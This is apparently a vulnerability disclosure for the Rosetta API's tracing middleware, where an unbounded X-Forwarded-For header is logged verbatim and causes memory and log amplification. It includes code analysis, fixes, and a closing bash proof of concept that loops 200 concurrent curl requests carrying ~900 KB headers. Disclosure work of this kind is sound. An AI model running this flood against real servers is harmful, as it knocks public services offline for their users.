### Title
Unbounded `X-Forwarded-For` Header Causes Per-Request Memory and Log I/O Amplification in Rosetta TracingMiddleware

### Summary
`getClientIpAddress()` in `rosetta/app/middleware/trace.go` reads the `X-Forwarded-For` header with no length bound and returns the raw value, which is then embedded verbatim into a log message via `fmt.Sprintf`. Because the deployment's Traefik ingress is explicitly configured with `--entryPoints.web.forwardedHeaders.insecure`, any external client can inject an arbitrarily large header value (up to Go's default 1 MB per-header limit), causing proportional memory allocation and log I/O overhead on every request without authentication.

### Finding Description

**Exact code path:**

`rosetta/app/middleware/trace.go`, `getClientIpAddress()`, lines 63–74:
```go
func getClientIpAddress(r *http.Request) string {
    ipAddress := r.Header.Get(xRealIpHeader)       // line 64
    if len(ipAddress) == 0 {
        ipAddress = r.Header.Get(xForwardedForHeader) // line 67 — no length check
    }
    ...
    return ipAddress   // raw, unbounded value returned
}
```

The returned value flows directly into `TracingMiddleware` at line 52:
```go
message := fmt.Sprintf("%s %s %s (%d) in %s",
    clientIpAddress, ...)   // allocates a new string of clientIpAddress's full length
log.Info(message)           // writes the full string to stdout via logrus
```

**Root cause:** There is no maximum-length guard on the `X-Forwarded-For` value before it is used as a format argument. The `http.Server` in `rosetta/main.go` (lines 220–227) sets no `MaxHeaderBytes` field, so Go's default of 1 MB applies — meaning a single header value can be up to ~1 MB.

**Why existing checks fail:**

- `len(ipAddress) == 0` (lines 66, 70) only checks for an *empty* string; it does not bound the length.
- The `http.Server` struct at `rosetta/main.go:220` configures `IdleTimeout`, `ReadHeaderTimeout`, `ReadTimeout`, and `WriteTimeout`, but **omits `MaxHeaderBytes`**, leaving the 1 MB default in place.
- Critically, `docker-compose.yml` line 644 configures Traefik with `--entryPoints.web.forwardedHeaders.insecure`, which instructs Traefik to **pass through client-supplied `X-Forwarded-For` values without stripping or validating them**. This removes the only realistic network-layer defense.

### Impact Explanation

Per malicious request carrying a ~1 MB `X-Forwarded-For` value:
- `fmt.Sprintf` allocates a new ~1 MB string on the heap.
- `log.Info` (logrus TextFormatter) serializes and writes that string to stdout.
- Under sustained fire (e.g., 100 req/s × 1 MB = 100 MB/s of log I/O and heap churn), Go's GC is forced into high-frequency collection cycles, CPU utilization rises sharply, and stdout/log-aggregation pipelines (Loki, etc.) are flooded.
- Disk or pipe exhaustion on the log sink can cause the process to block on `Write`, stalling all request handling goroutines.

This directly maps to the stated scope: increasing node resource consumption by ≥30% without brute-force volume, since each individual request carries amplified payload.

### Likelihood Explanation

- **No authentication required** — Rosetta API endpoints are public by design.
- **No rate limiting** is visible in the middleware stack (`MetricsMiddleware → TracingMiddleware → CorsMiddleware`).
- **Traefik is explicitly misconfigured** to forward attacker-controlled headers (`forwardedHeaders.insecure`), so the attack works from the public internet.
- The exploit requires only a standard HTTP client; no special tooling is needed.
- It is fully repeatable and automatable.

### Recommendation

1. **Truncate the header value** in `getClientIpAddress()` before returning it:
   ```go
   const maxIPLength = 45 // max IPv6 length
   if len(ipAddress) > maxIPLength {
       ipAddress = ipAddress[:maxIPLength]
   }
   ```
2. **Set `MaxHeaderBytes`** on the `http.Server` in `rosetta/main.go` to a small value (e.g., 8 KB) to reject oversized header blocks at the transport layer before they reach middleware.
3. **Remove `--entryPoints.web.forwardedHeaders.insecure`** from Traefik and instead use `trustedIPs` to only accept `X-Forwarded-For` from known upstream proxies.
4. **Validate that the header value is a valid IP address** (using `net.ParseIP`) before using it; fall back to `RemoteAddr` on parse failure.

### Proof of Concept

```bash
# Generate a ~900 KB X-Forwarded-For value and send it to the Rosetta endpoint
PAYLOAD=$(python3 -c "print('A' * 900000)")

curl -s -o /dev/null \
  -H "X-Forwarded-For: $PAYLOAD" \
  -H "Content-Type: application/json" \
  -d '{"network_identifier":{"blockchain":"Hedera","network":"testnet"}}' \
  http://<rosetta-host>:5700/network/list

# Repeat in a loop to amplify resource consumption:
for i in $(seq 1 200); do
  curl -s -o /dev/null \
    -H "X-Forwarded-For: $PAYLOAD" \
    -H "Content-Type: application/json" \
    -d '{"network_identifier":{"blockchain":"Hedera","network":"testnet"}}' \
    http://<rosetta-host>:5700/network/list &
done
wait
```

Each iteration causes the server to allocate and log ~900 KB. At 200 concurrent requests this is ~180 MB of heap allocation and log I/O in a single burst, with no authentication barrier.
